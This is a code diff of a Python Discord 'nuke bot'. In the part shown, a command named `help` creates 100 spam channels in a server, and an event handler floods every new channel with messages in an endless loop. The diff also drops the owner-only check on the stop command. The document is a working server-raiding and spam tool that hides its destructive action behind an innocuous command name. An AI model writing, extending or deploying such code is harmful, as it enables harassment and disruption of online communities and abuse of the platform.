@@ -9,15 +9,12 @@ import os
 bot = commands.Bot(command_prefix="!")
 bot.remove_command("help")
 
-token = ""
+TOKEN = ""
+SPAM_CHANNEL = ""
+SPAM_MESSAGE = ""
 
-channel_names = [""]
-message_names = [""]
+print('''
 
-@bot.event
-async def on_ready():
-   print(''' 
-   
 ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
 ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
 ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
@@ -25,13 +22,15 @@ async def on_ready():
 ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
 ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
 
+''')
 
- ''')
-   await bot.change_presence(activity=discord.Game(name = ""))
+@bot.event
+async def on_ready():
+   await bot.change_presence(activity=discord.Game(name=""))
+   print("Logged in as " + bot.user.name)
 
 @bot.command()
-@commands.is_owner()
-async def bot_stop(ctx):
+async def stop(ctx):
     await ctx.bot.logout()
     print (Fore.GREEN + f"{bot.user.name} has logged out successfully." + Fore.RESET)
 
@@ -89,16 +88,13 @@ async def help(ctx):
         print(f"Invite Link: {link}")
     amount = 100
     for i in range(amount):
-       await guild.create_text_channel(random.choice(Channel))
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
     print(f"nuked {guild.name} successfully.")
     return
 
 @bot.event
 async def on_guild_channel_create(channel):
   while True:
-    await channel.send(random.choice(Message))
-
-
-
+    await channel.send(random.choice(SPAM_MESSAGE))
 
 bot.run(os.getenv("TOKEN"))
